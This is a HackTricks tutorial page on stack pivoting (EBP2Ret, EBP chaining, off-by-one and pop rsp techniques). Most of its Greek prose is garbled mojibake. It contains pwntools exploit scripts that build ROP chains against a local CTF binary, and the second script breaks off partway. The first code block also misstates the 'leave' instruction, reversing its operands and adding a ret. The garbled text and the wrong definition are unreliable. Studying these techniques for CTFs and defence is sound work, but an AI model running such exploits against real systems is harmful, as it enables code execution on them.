# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î·Î½ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î± Î½Î± Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿ **Base Pointer (EBP)** Î³Î¹Î± Î½Î± Î±Î»Ï…ÏƒÎ¹Î¿Î´Î­ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï€Î¿Î»Î»ÏÎ½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ Î¼Î­ÏƒÏ‰ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ®Ï‚ Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î® EBP ÎºÎ±Î¹ Ï„Î·Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯Î±Ï‚ ÎµÎ½Ï„Î¿Î»ÏÎ½ **`leave; ret`**.

Î©Ï‚ Ï…Ï€ÎµÎ½Î¸ÏÎ¼Î¹ÏƒÎ·, **`leave`** ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ Î²Î±ÏƒÎ¹ÎºÎ¬:
```
mov       ebp, esp
pop       ebp
ret
```
And as the **EBP ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î¿ stack** Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿ EIP ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï„Î¿ ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¿ stack.

### EBP2Ret

Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ¯Î½Î±Î¹ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± Ï‡ÏÎ®ÏƒÎ¹Î¼Î· ÏŒÏ„Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿ EBP register Î±Î»Î»Î¬ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Î¬Î¼ÎµÏƒÎ¿ Ï„ÏÏŒÏ€Î¿ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿ EIP register**. Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ ÏŒÏ„Î±Î½ Î¿Î»Î¿ÎºÎ»Î·ÏÏÎ½Î¿Ï…Î½ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·.

Î•Î¬Î½, ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… `fvuln`, ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ Î­Î½Î± **ÏˆÎµÏÏ„Î¹ÎºÎ¿ EBP** ÏƒÏ„Î¿ stack Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Ï€ÎµÏÎ¹Î¿Ï‡Î® Î¼Î½Î®Î¼Î·Ï‚ ÏŒÏ€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… shellcode ÏƒÎ±Ï‚ (ÏƒÏ…Î½ 4 bytes Î³Î¹Î± Î½Î± Î»Î·Ï†Î¸ÎµÎ¯ Ï…Ï€ÏŒÏˆÎ· Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± `pop`), Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î­Î¼Î¼ÎµÏƒÎ± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ EIP. ÎšÎ±Î¸ÏÏ‚ Ï„Î¿ `fvuln` ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹, Ï„Î¿ ESP Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î±ÏƒÎ¼Î­Î½Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±, ÎºÎ±Î¹ Î· ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± `pop` Î¼ÎµÎ¹ÏÎ½ÎµÎ¹ Ï„Î¿ ESP ÎºÎ±Ï„Î¬ 4, **ÎºÎ¬Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î¿ Î½Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ ÎµÎºÎµÎ¯.**\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ 2 Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚**: Î‘Ï…Ï„Î® Ï€Î¿Ï… Î¸Î± Ï€Î¬ÎµÎ¹ Ï„Î¿ ESP, ÏŒÏ€Î¿Ï… Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Ï„Î¿ ESP.

#### ÎšÎ±Ï„Î±ÏƒÎºÎµÏ…Î® Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚

Î ÏÏÏ„Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Î¼Î¹Î± **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± / Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚**. Î¤Î¿ ESP Î¸Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÎµÎ´Ï ÎºÎ±Î¹ **Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ Ï€ÏÏÏ„Î¿ `ret`**.

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ `ret` Ï€Î¿Ï… Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ±**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ:

* ÎœÎ¹Î± Î­Î³ÎºÏ…ÏÎ· [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·.
* Î¤Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… **`system()`** Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î· Î±Ï€ÏŒ **4 Î¬Ï‡ÏÎ·ÏƒÏ„Î± bytes** ÎºÎ±Î¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… `"/bin/sh"` (x86 bits).
* Î¤Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÎ½ÏŒÏ‚ **gadget `jump esp;`** ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î· Î±Ï€ÏŒ Ï„Î¿ **shellcode** Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯.
* ÎœÎµÏÎ¹ÎºÎ® [**ROP**](../rop-return-oriented-programing/) Î±Î»Ï…ÏƒÎ¯Î´Î±.

Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î·Î½ ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î· Ï€ÎµÏÎ¹Î¿Ï‡Î® Ï„Î·Ï‚ Î¼Î½Î®Î¼Î·Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **`4` bytes** Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Î¼Î­ÏÎ¿Ï…Ï‚ **`pop`** Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ `leave`. Î˜Î± Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î¬ Ï„Î± 4B Î³Î¹Î± Î½Î± Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î­Î½Î± **Î´ÎµÏÏ„ÎµÏÎ¿ ÏˆÎµÏÏ„Î¹ÎºÎ¿ EBP** ÎºÎ±Î¹ Î½Î± ÏƒÏ…Î½ÎµÏ‡Î¯ÏƒÎµÏ„Îµ Î½Î± ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·.

#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Off-By-One

Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Ï€Î±ÏÎ±Î»Î»Î±Î³Î® Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ Î³Î½Ï‰ÏƒÏ„Î® Ï‰Ï‚ "Off-By-One Exploit". Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼ÏŒÎ½Î¿ Ï„Î¿ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ byte Ï„Î¿Ï… EBP**. Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± Î¼Î½Î®Î¼Î·Ï‚ Ï€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î·Î½ Î¿Ï€Î¿Î¯Î± Î¸Î± Î³Î¯Î½ÎµÎ¹ Î· **`ret`** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¼Î¿Î¹ÏÎ¬Î¶ÎµÏ„Î±Î¹ Ï„Î± Ï€ÏÏÏ„Î± Ï„ÏÎ¯Î± bytes Î¼Îµ Ï„Î¿ EBP, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÎ¼ÏŒ Î¼Îµ Ï€Î¹Î¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÏ…Î½Î¸Î®ÎºÎµÏ‚.\
Î£Ï…Î½Î®Î¸Ï‰Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ byte 0x00 Î³Î¹Î± Î½Î± Ï€Î·Î´Î®Î¾ÎµÎ¹ ÏŒÏƒÎ¿ Ï„Î¿ Î´Ï…Î½Î±Ï„ÏŒÎ½ Ï€Î¹Î¿ Î¼Î±ÎºÏÎ¹Î¬.

Î•Ï€Î¯ÏƒÎ·Ï‚, ÎµÎ¯Î½Î±Î¹ ÎºÎ¿Î¹Î½ÏŒ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± RET sled ÏƒÏ„Î¿ stack ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ Î· Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ROP Î±Î»Ï…ÏƒÎ¯Î´Î± ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Î³Î¹Î± Î½Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ Ï€Î¹Î¸Î±Î½ÏŒ ÏŒÏ„Î¹ Ï„Î¿ Î½Î­Î¿ ESP Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ RET SLED ÎºÎ±Î¹ Î· Ï„ÎµÎ»Î¹ÎºÎ® ROP Î±Î»Ï…ÏƒÎ¯Î´Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹.

### **EBP Chaining**

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ `EBP` Ï„Î¿Ï… stack ÎºÎ±Î¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î³Î¹Î± `leave; ret` ÏƒÏ„Î¿ `EIP`, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î¼ÎµÏ„Î±ÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Ï„Î¿ `ESP` ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· `EBP` Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ stack**.

Î¤ÏÏÎ±, Ï„Î¿ **`ESP`** ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î´ÎµÎ¯Ï‡Î½Î¿Î½Ï„Î±Ï‚ ÏƒÎµ Î¼Î¹Î± ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„Î® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎºÎ±Î¹ Î· ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÎµÎ½Ï„Î¿Î»Î® Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± `RET`. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ ÏƒÏ„Î·Î½ ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î· Î¸Î­ÏƒÎ· ESP Î±Ï…Ï„ÏŒ:

* **`&(next fake EBP)`** -> Î¦Î¿ÏÏ„ÏÎ½ÎµÎ¹ Ï„Î¿ Î½Î­Î¿ EBP Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… `pop ebp` Î±Ï€ÏŒ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `leave`
* **`system()`** -> ÎšÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ `ret`
* **`&(leave;ret)`** -> ÎšÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î¿Î»Î¿ÎºÎ»Î®ÏÏ‰ÏƒÎ· Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚, Î¸Î± Î¼ÎµÏ„Î±ÎºÎ¹Î½Î®ÏƒÎµÎ¹ Ï„Î¿ ESP ÏƒÏ„Î¿ ÏˆÎµÏÏ„Î¹ÎºÎ¿ EBP ÎºÎ±Î¹ Î¸Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¾Î±Î½Î¬
* **`&("/bin/sh")`**-> Î Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ Î³Î¹Î± Ï„Î¿ `system`

Î’Î±ÏƒÎ¹ÎºÎ¬, Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Î»Ï…ÏƒÎ¹Î¿Î´Î­ÏƒÎµÏ„Îµ Î±ÏÎºÎµÏ„Î¬ ÏˆÎµÏÏ„Î¹ÎºÎ± EBPs Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î· ÏÎ¿Î® Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚.

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ ÏƒÎ±Î½ Î­Î½Î± [ret2lib](../rop-return-oriented-programing/ret2lib/), Î±Î»Î»Î¬ Ï€Î¹Î¿ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ¿ Ï‡Ï‰ÏÎ¯Ï‚ Ï€ÏÎ¿Ï†Î±Î½Î­Ï‚ ÏŒÏ†ÎµÎ»Î¿Ï‚ Î±Î»Î»Î¬ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÎµÎ´Ï Î­Ï‡ÎµÏ„Îµ Î­Î½Î± [**Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Î¹Î±Ï‚ Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·Ï‚**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î¼Îµ Î¼Î¹Î± **Î´Î¹Î±ÏÏÎ¿Î® stack** Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Î½Î¹ÎºÎ·Ï†ÏŒÏÎ± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï„ÎµÎ»Î¹ÎºÏŒ payload Î±Ï€ÏŒ Ï„Î· ÏƒÎµÎ»Î¯Î´Î±:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹

ÎŒÏ€Ï‰Ï‚ [**ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), Î±Î½ Î­Î½Î± Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î­Ï‡ÎµÎ¹ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÏ„ÎµÎ¯ Î¼Îµ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î²ÎµÎ»Ï„Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚, Ï„Î¿ **EBP Ï€Î¿Ï„Î­ Î´ÎµÎ½ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î¿ ESP**, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚, Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¿ EBP Î¸Î± Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ Î²Î±ÏƒÎ¹ÎºÎ¬ Î³Î¹Î±Ï„Î¯ Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ ÎºÎ±Î¼Î¯Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ·.\
Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® Î¿Î¹ **Ï€ÏÎ¿Î»ÏŒÎ³Î¿Î¹ ÎºÎ±Î¹ Î¿Î¹ ÎµÏ€Î¹Î»ÏŒÎ³Î¿Î¹ Î±Î»Î»Î¬Î¶Î¿Ï…Î½** Î±Î½ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ Î²ÎµÎ»Ï„Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿.

* **ÎœÎ· Î²ÎµÎ»Ï„Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Î’ÎµÎ»Ï„Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï„Î¿Ï… RSP

### **`pop rsp`** gadget

[**Î£Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î±**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®. Î“Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· Î®Ï„Î±Î½ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ 2 ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ®Î¼Î±Ï„Î±, ÎºÎ±Î¹ Ï…Ï€Î®ÏÏ‡Îµ Î­Î½Î± **`pop rsp` gadget** ÎºÎ±Î¹ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± **leak Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î±**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
